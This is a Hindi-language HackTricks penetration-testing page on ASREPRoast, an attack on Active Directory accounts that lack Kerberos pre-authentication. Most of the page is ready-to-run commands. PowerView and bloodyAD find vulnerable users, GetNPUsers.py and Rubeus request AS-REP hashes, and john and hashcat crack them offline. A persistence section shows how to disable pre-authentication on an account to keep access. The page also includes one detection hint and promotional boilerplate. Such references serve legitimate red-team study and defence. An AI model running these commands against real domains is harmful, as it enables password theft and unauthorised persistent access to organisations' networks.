# ASREPRoast

<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो** करें।
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल हों और अनुभवी हैकर्स और बग बाउंटी हंटर्स के साथ संवाद करें!

**हैकिंग इनसाइट्स**\
हैकिंग के रोमांच और चुनौतियों के बारे में गहराई से जानकारी प्राप्त करें

**रियल-टाइम हैक न्यूज**\
रियल-टाइम न्यूज और इनसाइट्स के माध्यम से हैकिंग की तेजी से बदलती दुनिया के साथ अपडेट रहें

**नवीनतम घोषणाएँ**\
नवीनतम बग बाउंटीज लॉन्चिंग और महत्वपूर्ण प्लेटफॉर्म अपडेट्स के साथ सूचित रहें

**हमसे** [**Discord**](https://discord.com/invite/N3FrSbmwdy) पर जुड़ें और आज ही शीर्ष हैकर्स के साथ सहयोग करना शुरू करें!

## ASREPRoast

ASREPRoast हमला **उन उपयोगकर्ताओं की खोज करता है जिनके पास Kerberos प्री-प्रमाणीकरण आवश्यक विशेषता नहीं है (**[_**DONT\_REQ\_PREAUTH**_](https://support.microsoft.com/en-us/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro)_**)**_.

इसका मतलब है कि कोई भी उन उपयोगकर्ताओं में से किसी की ओर से DC को AS\_REQ अनुरोध भेज सकता है, और AS\_REP संदेश प्राप्त कर सकता है। यह अंतिम प्रकार का संदेश एक डेटा चंक होता है जो मूल उपयोगकर्ता की कुंजी से एन्क्रिप्टेड होता है, जो उसके पासवर्ड से निकाला गया होता है। फिर, इस संदेश का उपयोग करके, उपयोगकर्ता का पासवर्ड ऑफलाइन क्रैक किया जा सकता है।

इसके अलावा, इस हमले को करने के लिए **किसी डोमेन खाते की आवश्यकता नहीं होती**, केवल DC से कनेक्शन की जरूरत होती है। हालांकि, **एक डोमेन खाते के साथ**, LDAP क्वेरी का उपयोग करके **डोमेन में Kerberos प्री-प्रमाणीकरण के बिना उपयोगकर्ताओं को पुनः प्राप्त किया जा सकता है**। **अन्यथा उपयोगकर्ता नामों का अनुमान लगाना होगा**।

#### संवेदनशील उपयोगकर्ताओं का अनुक्रमण (डोमेन क्रेडेंशियल्स की आवश्यकता है)

{% code title="विंडोज का उपयोग करते हुए" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
```
{% endcode %}

{% code title="लिनक्स का उपयोग करते हुए" %}
```
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS\_REP संदेश का अनुरोध

{% code title="लिनक्स का उपयोग करते हुए" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
```
{% endcode %}

{% code title="विंडोज का उपयोग करते हुए" %}
```
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeus के साथ AS-REP Roasting एक 4768 इवेंट उत्पन्न करेगा जिसका एन्क्रिप्शन प्रकार 0x17 होगा और प्रीऑथ प्रकार 0 होगा।
{% endhint %}

### क्रैकिंग
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### स्थायित्व

जहां आपके पास **GenericAll** अनुमतियां हैं (या गुण लिखने की अनुमतियां हैं), वहां उपयोगकर्ता के लिए **preauth** आवश्यक नहीं होने के लिए बल दें:

{% code title="विंडोज का उपयोग करते हुए" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
```
{% endcode %}

{% code title="लिनक्स का उपयोग करते हुए" %}
```
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## संदर्भ

[**AS-REP Roasting के बारे में अधिक जानकारी ired.team में**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) सर्वर में शामिल हों और अनुभवी हैकर्स और बग बाउंटी हंटर्स के साथ संवाद करें!

**हैकिंग अंतर्दृष्टि**\
हैकिंग के रोमांच और चुनौतियों पर गहराई से जानकारी प्राप्त करें

**रियल-टाइम हैक समाचार**\
रियल-टाइम समाचार और अंतर्दृष्टि के माध्यम से हैकिंग दुनिया के साथ अद्यतन रहें

**नवीनतम घोषणाएँ**\
नवीनतम बग बाउंटीज के लॉन्चिंग और महत्वपूर्ण प्लेटफॉर्म अपडेट्स के साथ सूचित रहें

[**Discord**](https://discord.com/invite/N3FrSbmwdy) पर हमसे जुड़ें और आज ही शीर्ष हैकर्स के साथ सहयोग करना शुरू करें!

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में **शामिल हों** या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
